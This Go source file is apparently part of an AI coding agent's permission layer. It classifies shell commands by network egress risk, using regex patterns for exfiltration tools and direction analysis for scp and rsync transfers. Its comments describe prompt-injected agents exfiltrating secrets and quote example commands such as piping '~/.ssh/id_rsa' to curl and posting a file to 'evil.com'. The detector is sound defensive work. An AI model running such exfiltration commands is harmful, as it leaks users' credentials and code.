package permission

// Network Egress Detection — Data Exfiltration Warning
//
// While DangerousDetector catches destructive commands (rm -rf, mkfs, git
// push --force), it does not detect network commands that could exfiltrate
// sensitive data to an external endpoint. A prompt-injected agent can silently
// send source code, credentials, or environment variables to an attacker's
// server via curl/wget/scp/rsync without triggering any warning.
//
// Competitor approaches:
//   - Codex CLI: full network sandbox — blocks ALL outbound network by default
//   - Claude Code: warns on network commands and asks for confirmation
//   - Cursor: network trust level setting per workspace
//   - Cline: command classification with per-type auto-approve
//
// Our approach: classify network commands into two tiers:
//   1. Exfiltration risk: commands that read local files and send them
//      externally (curl -d @file, scp, rsync to remote, wget --post-file,
//      nc < file). These trigger Ask even in Auto mode.
//   2. General network access: commands that make outbound connections
//      without file data (curl URL, wget URL, base64 | nc). These trigger
//      Ask in Auto mode and show a network warning in supervised mode.
//
// Integration: called from ConfigPolicy.Check() BEFORE the normal dangerous
// detector, because network detection is orthogonal to destructive detection
// — a command can be both (e.g., curl | bash).

import (
	"regexp"
	"strings"
)

// NetworkRisk classifies the network exposure of a command.
type NetworkRisk int

const (
	// NetworkNone: no outbound network access detected.
	NetworkNone NetworkRisk = iota
	// NetworkAccess: the command makes outbound network connections but does
	// not appear to upload file contents. Examples: curl URL, wget URL.
	NetworkAccess
	// NetworkExfiltrate: the command reads local file contents and sends them
	// to an external endpoint. Examples: curl -d @file URL, scp file host:,
	// rsync dir host:, wget --post-file=file URL.
	NetworkExfiltrate
)

func (r NetworkRisk) String() string {
	switch r {
	case NetworkNone:
		return "none"
	case NetworkAccess:
		return "network"
	case NetworkExfiltrate:
		return "exfiltrate"
	default:
		return "unknown"
	}
}

// NetworkCheck holds the result of network egress analysis.
type NetworkCheck struct {
	Risk   NetworkRisk
	Reason string
}

// networkPattern matches a class of network commands.
type networkPattern struct {
	risk   NetworkRisk
	re     *regexp.Regexp
	reason string
}

// networkPatterns are evaluated in order; the first match wins (most specific
// patterns first so that exfiltration is detected before general access).
var networkPatterns = []networkPattern{
	// --- Exfiltration: file contents sent externally ---

	// curl/wget with file-based POST/upload
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*(--data[- ]binary|-d|--data)[=\s]*@`), "curl sending local file contents via POST data"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*(--upload-file|-T)[=\s]`), "curl uploading a local file to a remote server"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*--post-file[=\s]`), "curl posting a local file to a URL"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*-F\s+.*=@`), "curl uploading a local file as form data"},
	// curl/wget reading the request body from stdin combined with an input
	// redirection — "curl URL -T- < ~/.ssh/id_rsa" uploads the file's
	// contents without ever naming it as a file argument (#373).
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*(--upload-file|-T)[=\s]*-\s*<`), "curl uploading stdin (redirected from a local file) to a remote server"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*(-d|--data|--data-binary|--data-raw|--post-file)[=\s]*-?\s*<\s*\S`), "curl with a data flag and input redirection sends a local file as request body"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bwget\b.*--post-file`), "wget posting a local file to a URL"},

	// nc/netcat piping a file
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bnc\b.*<\s`), "netcat piping a local file to a remote host"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bncat\b.*<\s`), "ncat piping a local file to a remote host"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bsocat\b.*`), "socat can relay data to external endpoints"},

	// base64/xxd encode piped to network commands (stealth exfiltration)
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\b(base64|xxd|od)\b.*\|\s*(curl|wget|nc|ncat)\b`), "encoding local data and piping to a network command (potential exfiltration)"},

	// cat/type file piped to network command
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\b(cat|type)\b.*\|\s*(curl|wget|nc|ncat)\b`), "piping file contents to a network command (potential exfiltration)"},

	// Python/Ruby/Node/Perl one-liners with network libraries
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bpython3?\s+-c\b.*(urllib|requests|http\.client|socket)`), "Python one-liner with network library (potential exfiltration)"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bnode\s+-e\b.*(http|https|net\.|fetch|axios)`), "Node.js one-liner with network library (potential exfiltration)"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bruby\s+-e\b.*(net/http|socket|uri)`), "Ruby one-liner with network library (potential exfiltration)"},
	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bperl\s+-e\b.*(IO::Socket|LWP|HTTP::Tiny)`), "Perl one-liner with network library (potential exfiltration)"},

	// --- General network access (no file data upload) ---

	// curl/wget to a URL (download or general HTTP request)
	{NetworkAccess, regexp.MustCompile(`(?i)\bcurl\b`), "curl makes an outbound network request"},
	{NetworkAccess, regexp.MustCompile(`(?i)\bwget\b`), "wget makes an outbound network request"},
	{NetworkAccess, regexp.MustCompile(`(?i)\bnc\b.*\s+\S+\s+\d+`), "netcat connecting to a remote host:port"},
	{NetworkAccess, regexp.MustCompile(`(?i)\bncat\b.*\s+\S+\s+\d+`), "ncat connecting to a remote host:port"},

	// ssh/ansible (remote execution)
	{NetworkAccess, regexp.MustCompile(`(?i)\bssh\b`), "ssh connects to a remote host"},
	{NetworkAccess, regexp.MustCompile(`(?i)\bansible\b`), "ansible executes commands on remote hosts"},
	{NetworkAccess, regexp.MustCompile(`(?i)\btelnet\b`), "telnet connects to a remote host"},
	{NetworkAccess, regexp.MustCompile(`(?i)\bftp\b\s`), "ftp connects to a remote server"},

	// Package managers that download from network (but within project scope,
	// these are usually legitimate — classify as NetworkAccess, not exfiltrate)
	// We intentionally do NOT flag: go get, go mod, npm install, pip install,
	// yarn add, cargo add, brew install, etc. These are normal dev workflows.
}

// CheckNetwork analyzes a command for network egress risk.
// Returns the first matching pattern (most specific wins).
func CheckNetwork(command string) NetworkCheck {
	cmd := strings.TrimSpace(command)
	if cmd == "" {
		return NetworkCheck{Risk: NetworkNone}
	}

	base := checkNetworkPatterns(cmd)
	// scp/rsync are direction-sensitive: only a remote *destination* is
	// exfiltration — a remote source (download) or a purely local copy is
	// general access at most (#641). They are analyzed structurally instead
	// of via the regex table; the more severe of the two verdicts wins so a
	// compound command ("curl -d @f evil.com; rsync a b") keeps its
	// regex-detected risk.
	if dir, ok := scpRsyncDirection(cmd); ok && dir.Risk > base.Risk {
		return dir
	}
	return base
}

func checkNetworkPatterns(cmd string) NetworkCheck {
	for _, p := range networkPatterns {
		if p.re.MatchString(cmd) {
			return NetworkCheck{
				Risk:   p.risk,
				Reason: p.reason,
			}
		}
	}
	return NetworkCheck{Risk: NetworkNone}
}

// IsNetworkCommand returns true if the command makes any outbound network
// connection (access or exfiltration risk).
func IsNetworkCommand(command string) bool {
	return CheckNetwork(command).Risk != NetworkNone
}

// IsNetworkExfiltrate returns true if the command is classified as
// exfiltration risk (sending local file contents externally).
func IsNetworkExfiltrate(command string) bool {
	return CheckNetwork(command).Risk == NetworkExfiltrate
}

// Suggestion returns a human-readable network risk description.
func (c NetworkCheck) Suggestion() string {
	if c.Risk == NetworkNone {
		return ""
	}
	return c.Reason
}

// --- scp/rsync transfer-direction analysis (#641) ---
//
// The old regexes matched the command name only: any scp, and any rsync whose
// arguments contained a colon anywhere (including "--exclude='a:b'"), was
// classified as exfiltration. That forced Ask even in bypass/autopilot for
// pure downloads ("scp user@host:/remote/log ./") and local copies, blocking
// unattended runs with a misleading "sends local file contents" warning.
// Direction is what matters: only a remote *destination* uploads data.

// scpRsyncDirection classifies every scp/rsync invocation in cmd by transfer
// direction. The most severe verdict is returned; ok is false when cmd
// contains no scp/rsync token.
func scpRsyncDirection(cmd string) (NetworkCheck, bool) {
	tokens := tokenizeCommand(cmd)
	found := false
	var worst NetworkCheck
	for i := 0; i < len(tokens); i++ {
		base := tokens[i]
		if j := strings.LastIndexByte(base, '/'); j >= 0 {
			base = base[j+1:] // "/usr/bin/scp" → "scp"
		}
		if base != "scp" && base != "rsync" && !strings.EqualFold(base, "scp") && !strings.EqualFold(base, "rsync") {
			continue
		}
		found = true
		if res := analyzeTransfer(strings.EqualFold(base, "scp"), tokens, i+1); res.Risk > worst.Risk {
			worst = res
		}
	}
	return worst, found
}

// analyzeTransfer classifies one scp/rsync invocation whose command name is
// at tokens[start-1]. Operand scanning stops at the next shell separator
// (| ; & && || > <) because that starts a different command.
func analyzeTransfer(isScp bool, tokens []string, start int) NetworkCheck {
	var operands []string
	for i := start; i < len(tokens); i++ {
		t := tokens[i]
		if isShellSeparator(t) {
			break
		}
		if strings.HasPrefix(t, "-") && t != "-" && t != "--" {
			// Option. Attached values (--exclude=a:b, -P22) are
			// self-contained; bare value-taking options skip the next token so
			// their values (which may contain colons) are never mistaken for
			// remote operands (#641).
			name := strings.TrimLeft(t, "-")
			if strings.ContainsRune(name, '=') {
				continue
			}
			if optionTakesValue(isScp, name) {
				i++
			}
			continue
		}
		operands = append(operands, t)
	}
	if len(operands) == 0 {
		return NetworkCheck{Risk: NetworkAccess, Reason: "scp/rsync command without operands (direction unknown)"}
	}
	// The last operand is the destination; earlier ones are sources.
	if isRemoteOperand(operands[len(operands)-1]) {
		return NetworkCheck{Risk: NetworkExfiltrate, Reason: "scp/rsync copying local files to a remote host"}
	}
	for _, src := range operands[:len(operands)-1] {
		if isRemoteOperand(src) {
			return NetworkCheck{Risk: NetworkAccess, Reason: "scp/rsync downloading from a remote host (remote is the source, not the destination)"}
		}
	}
	return NetworkCheck{Risk: NetworkAccess, Reason: "scp/rsync local copy (no remote operand)"}
}

// optionTakesValue reports whether the given scp/rsync option consumes the
// next command-line token as its value.
func optionTakesValue(isScp bool, name string) bool {
	if isScp {
		switch name {
		case "i", "l", "o", "P", "S", "F", "c", "J": // identity, limit, ssh_option, port, program, config, cipher, jump
			return true
		}
		return false
	}
	if name == "e" { // rsync -e/--rsh SHELL
		return true
	}
	switch name {
	case "rsh", "exclude", "include", "filter", "exclude-from", "include-from",
		"files-from", "suffix", "chmod", "chown", "usermap", "groupmap",
		"rsync-path", "password-file", "compare-dest", "copy-dest", "link-dest",
		"backup-dir", "block-size", "max-size", "min-size", "compress-level",
		"log-file", "out-format", "temp-dir", "partial-dir":
		// #654: exclude/include (and filter) take their pattern as a BARE next
		// token (--exclude 'srv:cache' == --exclude=srv:cache). Without them
		// here the tokenizer treats the pattern as an operand, and a pattern
		// containing a colon (no slash prefix, not a drive letter) passes
		// isRemoteOperand — corrupting the source/destination direction
		// analysis added in #641.
		return true
	}
	return false
}

// isRemoteOperand reports whether an scp/rsync operand uses remote syntax
// ([user@]host:path, host::module, or rsync://host/module). A colon that
// appears inside a local path (after a slash: ./a:b, /tmp/x:y) or a Windows
// drive letter (C:/x) is not a remote marker (#641).
func isRemoteOperand(s string) bool {
	if s == "" || s == "-" {
		return false
	}
	if strings.HasPrefix(s, "rsync://") || strings.HasPrefix(s, "ssh://") {
		return true
	}
	colon := strings.IndexByte(s, ':')
	if colon <= 0 {
		return false
	}
	if strings.ContainsAny(s[:colon], "/\\") {
		return false // colon sits inside a path component → local path
	}
	if colon == 1 && isASCIILetter(s[0]) {
		return false // "C:/x", "D:\\x" — Windows drive letter, not a host
	}
	return true
}

func isASCIILetter(c byte) bool {
	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
}

func isShellSeparator(t string) bool {
	switch t {
	case "|", ";", "&", "&&", "||", ">", ">>", "<", "2>", "2>>":
		return true
	}
	return false
}

// tokenizeCommand splits a shell command line into tokens, stripping quotes
// and backslash escapes and emitting shell operators (| ; & && || > >> <) as
// standalone tokens. It is deliberately lightweight: command substitution,
// heredocs and arithmetic are out of scope for network classification.
func tokenizeCommand(cmd string) []string {
	t := &cmdTokenizer{}
	for i := 0; i < len(cmd); i++ {
		c := cmd[i]
		switch {
		case t.quote != 0:
			if c == t.quote {
				t.quote = 0
			} else {
				t.cur.WriteByte(c)
			}
		case c == '\'' || c == '"':
			t.quote = c
		case c == '\\' && i+1 < len(cmd):
			i++
			t.cur.WriteByte(cmd[i])
		case isShellSpace(c):
			t.flush()
		case isShellOperatorChar(c):
			i = t.pushOperator(cmd, i)
		default:
			t.cur.WriteByte(c)
		}
	}
	t.flush()
	return t.tokens
}

func isShellSpace(c byte) bool {
	return c == ' ' || c == '\t' || c == '\r' || c == '\n'
}

func isShellOperatorChar(c byte) bool {
	return c == '|' || c == ';' || c == '&' || c == '<' || c == '>'
}

// cmdTokenizer carries tokenizer state between characters so the main loop
// stays a flat switch.
type cmdTokenizer struct {
	tokens []string
	cur    strings.Builder
	quote  byte
}

func (t *cmdTokenizer) flush() {
	if t.cur.Len() > 0 {
		t.tokens = append(t.tokens, t.cur.String())
		t.cur.Reset()
	}
}

// pushOperator emits a shell operator token starting at cmd[i], collapsing
// runs of the same operator character (&&, ||, >>). An fd prefix ("2>")
// belongs to the separator, not an operand, so a pending all-digit token is
// folded into it. Returns the index of the last consumed byte.
func (t *cmdTokenizer) pushOperator(cmd string, i int) int {
	if t.cur.Len() > 0 && isAllDigits(t.cur.String()) {
		t.cur.Reset()
	}
	t.flush()
	c := cmd[i]
	j := i
	for j < len(cmd) && cmd[j] == c {
		j++
	}
	t.tokens = append(t.tokens, cmd[i:j])
	return j - 1
}

func isAllDigits(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			return false
		}
	}
	return len(s) > 0
}
